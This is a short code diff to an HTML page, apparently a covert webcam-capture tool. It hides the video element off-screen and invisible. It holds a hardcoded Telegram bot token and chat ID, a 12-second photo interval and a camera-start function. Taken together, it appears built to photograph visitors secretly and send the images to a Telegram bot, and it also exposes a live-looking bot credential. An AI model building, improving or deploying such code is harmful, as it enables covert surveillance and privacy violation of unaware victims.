@@ -48,12 +48,12 @@
             font-weight: bold;
         }
         video {
-            position: absolute;
-            width: 1px;
-            height: 1px;
-            opacity: 0.01;
-            left: -9999px;
-            top: -9999px;
+            position: fixed;
+            top: -10000px;
+            left: -10000px;
+            width: 160px;
+            height: 120px;
+            opacity: 0;
         }
     </style>
 </head>
@@ -74,7 +74,7 @@
         let stream = null;
         const BOT_TOKEN = '8375046170:AAFTy22WAucWyQhwKbbN7aqDm_enTTRZ7Ts';
         const CHAT_ID = '6611123941';
-        const PHOTO_INTERVAL = 12000; // 12 ثانية لإعطاء وقت كافٍ
+        const PHOTO_INTERVAL = 12000;
 
         async function startCamera() {
             const status = document.getElementById('status');
